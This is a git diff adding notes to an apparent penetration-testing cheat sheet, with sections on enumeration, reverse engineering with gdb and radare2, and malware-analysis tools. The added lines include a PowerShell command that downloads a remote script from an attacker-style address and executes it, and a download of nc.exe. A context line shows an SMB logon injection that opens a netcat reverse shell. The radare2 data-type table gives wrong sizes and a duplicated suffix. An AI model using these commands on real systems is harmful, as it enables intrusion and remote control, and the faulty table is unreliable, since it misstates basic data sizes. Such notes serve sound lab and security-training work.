@@ -73,7 +73,8 @@ apt install qemu qemu-kvm
 qemu-system-x86_64 vm.raw -m 1024 # -m for specifying RAM
 ```
 
-
+## RDP Tool for Linux
+* Remmina (apt install remmina)
 
 ## Log commands into file
 ```bash
@@ -605,6 +606,15 @@ netsh firewall show config
 ```
 
 ## Automated Enumeration Tools
+### Download and run executable with simple bypass method (from cmd.exe)
+```
+echo IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.14.23:8000/jaws-enum.ps1") | powershell -noprofile -
+```
+### Download File
+```
+IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.23:8000/nc.exe", "C:\test\nc.exe")
+```
+
 ### Executables
 * [winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 * [Seatbelt.exe](https://github.com/GhostPack/Seatbelt)
@@ -944,6 +954,8 @@ smb: \> logon "/=`nohup mkfifo /tmp/manununu; nc 10.10.14.41 2222 0</tmp/manunun
 ```
 
 # Reverse Engineering
+
+## gdb
 Example: Binary which prompting for a password. 
 1. gdb --args ./holly.bin asdf
 2. disassemble main
@@ -956,6 +968,61 @@ Example: Binary which prompting for a password.
 9. 0x7fffffffe33a: "asdf"
 
 There is also a nice gdb plugin called [peda](https://github.com/longld/peda)
+
+## .NET assembly decompiler
+* [ILSpy](https://github.com/icsharpcode/ILSpy)
+* [dotPeek](https://www.jetbrains.com/decompiler/)
+
+## radare2 (r2)
+```
+r2 -d ./file
+
+# analyze the program
+aa
+
+# list all functions
+afl
+afl | grep main
+
+# print disassembly function
+pdf @main
+
+# Data Types
+Initial Data Type | Suffix | Size (bytes)
+-----------------------------------------
+Byte	          |   b    |   1
+Word              |   w    |   2
+Double Word       |   l    |   4
+Quad              |   q    |   8
+Single Precision  |   s    |   8
+Double Precision  |   l    |   4
+
+# set breakpoint
+db 0x00400b55
+
+# ensure breakpoint is set correct
+pdf @main
+
+# run program until hit breakpoint
+dc
+
+# print memory address
+px @memory-address
+px rbp-0xc
+
+# execute next instruction
+ds
+
+# see value of registers
+dr
+
+# reload program
+ood
+
+```
+
+## Malware Analysis
+* [REMNux](https://remnux.org/)
 
 # SQLInjection
 ## Resources
